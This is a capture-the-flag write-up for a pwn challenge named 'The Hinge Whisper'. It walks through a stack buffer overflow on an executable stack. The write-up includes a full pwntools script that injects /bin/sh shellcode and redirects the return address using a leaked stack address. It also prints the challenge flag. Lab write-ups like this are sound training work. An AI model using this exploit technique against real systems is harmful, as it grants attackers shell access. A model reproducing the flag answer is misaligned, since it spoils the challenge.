# 2. The Hinge Whisper

**Category:** pwn — stack address leak + shellcode-on-stack **Protections:** PIE enabled · No canary · **NX disabled** (executable stack)

## Approach

`service_hatch()` contained a 64-byte stack buffer and:

1. Printed the buffer's own address directly via `%p` — a free, built-in stack leak (no brute-forcing needed to defeat PIE for this local address).
2. Called `read(0, buf, 0x50)` — 80 bytes into the 64-byte buffer, exactly `buf(64) + saved_rbp(8) + return_addr(8) = 80` bytes to reach the return address precisely.

Since `GNU_STACK` was marked **RWE**, the classic technique applies: place shellcode inside the leaked buffer, then overwrite the return address with that same (now-known) address so execution jumps straight into it.

```python
from pwn import *
import re

io = remote(HOST, PORT)
banner = io.recvuntil(b"keyway sits at:").decode() + io.recvline().decode()
leak = int(re.search(r"0x[0-9a-fA-F]+", banner).group(), 16)

shellcode = asm(shellcraft.sh())              # execve("/bin/sh", NULL, NULL)
payload = shellcode.ljust(64, b"\x90")        # pad to fill the 64-byte buffer
payload += b"J" * 8                           # junk saved rbp
payload += p64(leak)                          # return -> our own shellcode

io.sendline(payload)
io.interactive()
```

## Flag

```
HTB{th3_h1ng3_wh1sp3r5_t0_th0s3_wh0_l1st3n_b69304b4132476826c1d5a1a736333d6}
```
## Author: [Anurag886354](https://github.com/Anurag886354)


